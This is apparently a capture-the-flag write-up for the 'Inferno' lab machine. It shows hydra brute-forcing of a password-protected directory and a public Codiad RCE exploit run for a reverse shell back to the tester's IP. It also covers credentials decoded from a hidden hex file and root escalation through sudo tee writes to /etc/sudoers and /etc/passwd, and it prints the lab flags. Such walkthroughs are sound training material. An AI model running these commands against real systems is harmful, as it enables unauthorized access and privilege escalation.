# Inferno
Difficulty = Medium
IP = 10.10.99.146

## Web enumeration

Scan the IP with rustscan or nmap and I found out 22 and 80 open.
Run gobuster scan on URL.
I found one directory named inferno which was protected by password.

Since we don't have a specific username to crack with, I wrote some possible usernames:

```
admin
root
inferno
dante
```
Lets crack the password with hydra.

```
hydra -L possibleUsers.txt -P /usr/share/wordlists/rockyou.txt 10.10.99.146 http-get /inferno/ -t 64
```

```
login: admin   password: dante1
```

Lets login into the directory.

After loging in twice with the same creds, there was a codiad IDE. On searching an exploit for codiad, I found [exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit).
This exploit needs 3 terminals. In one run this exploit as:

```
python2 exploit.py http://admin:dante1@10.10.99.146/inferno 'admin' 'dante1' <Your-THM-IP> <listening-PORT> linux
```
In others, run the command as given by the expoit.

I got the shell but everytime I got a reverse shell, after sometime, it crashed. One time, when I got shell, I quickly ran /bin/sh and it worked. Now it doesn't crashes.

## Local.txt

In /home/dante/Downloads/ there is a hidden file .download.dat. Its content are:

```
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

After decoding it online from hex, I got dante's creds.

```
dante:V1rg1l10h3lpm3
```

Now ssh into the machine.

local.txt was in dante's home directory.

Local.txt

```
77f6f3c544ec0811e2d1243e2e0d1835
```

## Pivellege escalation

When I ran sudo -l, I found that we can run /usr/bin/tee as root.
Which means, we can write into any file as root.

There are many ways of escalating to root.

Two of them are:

```
echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
```

This will give dante all permissions as root.
After this, run sudo su and we got root.

Another way is adding another user with root privelleges.
```
openssl passwd -1 -salt pwn pwn
```

This will give a hash.

```
echo "pwn:<HASH>:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```
After this, sun sudo pwn and get root shell.

Proof.txt

```
f332678ed0d0767d7434b8516a7c6144
```
